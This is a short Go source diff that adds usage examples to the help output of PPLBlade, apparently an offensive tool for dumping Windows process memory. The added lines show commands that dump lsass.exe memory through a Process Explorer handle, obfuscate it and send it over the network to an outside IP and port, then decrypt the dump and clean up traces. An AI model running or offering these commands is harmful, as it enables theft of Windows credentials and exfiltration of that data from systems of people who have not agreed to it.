@@ -60,6 +60,11 @@ func main() {
 	if *HELP {
 		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
 		flag.PrintDefaults()
+		fmt.Println("\nExamples: ")
+		fmt.Println("PPLBlade.exe --mode dothatlsassthing")
+		fmt.Println("PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234")
+		fmt.Println("PPLBlade.exe --mode decrypt --dumpname PPLBlade.dmp --key PPLBlade")
+		fmt.Println("PPLBlade.exe --mode cleanup")
 		return
 	}
 	FillArguments()
